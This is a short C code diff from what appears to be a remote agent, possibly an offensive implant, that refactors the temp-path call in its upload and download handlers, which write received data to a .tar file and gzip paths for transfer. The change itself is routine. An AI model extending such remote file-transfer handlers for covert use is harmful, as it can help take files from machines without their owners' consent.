@@ -723,7 +723,7 @@ PENVELOPE UploadHandler
 	UnmarshaledData[1] = NULL;
 	IsDirectory = (BOOL)UnmarshaledData[3];
 	if (IsDirectory) {
-		GenerateTempPathW(NULL, L".tar", NULL, &lpZipPath);
+		lpZipPath = GenerateTempPathW(NULL, L".tar", NULL);
 		if (!WriteToFile(lpZipPath, pData->pBuffer, pData->cbBuffer)) {
 			goto CLEANUP;
 		}
@@ -808,7 +808,7 @@ PENVELOPE DownloadHandler
 		IsDirectory = TRUE;
 	}
 
-	GenerateTempPathW(NULL, L".tar", NULL, &lpZipPath);
+	lpZipPath = GenerateTempPathW(NULL, L".tar", NULL);
 	pData = ALLOC(sizeof(BUFFER));
 	if (IsDirectory || Compress) {
 		CompressPathByGzip(lpTempStr, lpZipPath);
